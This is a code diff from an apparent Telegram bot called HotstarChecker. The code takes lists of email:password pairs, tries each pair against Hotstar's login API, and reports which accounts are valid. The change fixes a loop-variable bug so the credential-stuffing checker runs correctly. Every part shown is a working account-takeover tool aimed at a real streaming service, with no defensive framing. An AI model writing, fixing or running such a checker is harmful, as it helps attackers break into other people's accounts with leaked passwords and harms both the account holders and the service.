@@ -148,9 +148,8 @@ async def checker(bot: HotstarChecker, message: Message):
         bad_accs = "Bad Accounts:\n"
         try:
             for one_acc in accs:
-                email, password = one_acc.split(":")
                 try:
-                    email, password = account.split(":")
+                    email, password = one_acc.split(":")
                     url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
                     payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
                     headers = {
@@ -165,13 +164,13 @@ async def checker(bot: HotstarChecker, message: Message):
                         }
                     r = requests.post(url, data=json.dumps(payload), headers=headers)
                     if r.status_code==200:
-                        hit_accs += f"\n- <code>{account}</code>: Valid ✅"             
+                        hit_accs += f"\n- <code>{one_acc}</code>: Valid ✅"             
                         hits += 1
                     else:
-                        bad_accs += f"\n- <code>{account}</code>: Invalid ❌"
+                        bad_accs += f"\n- <code>{one_acc}</code>: Invalid ❌"
                         bad += 1
                 except:
-                    bad_accs += f"\n- <code>{account}</code>: Invalid Format ❌"
+                    bad_accs += f"\n- <code>{one_acc}</code>: Invalid Format ❌"
                     bad += 1
                     
             cleanr = re.compile("<.*?>")
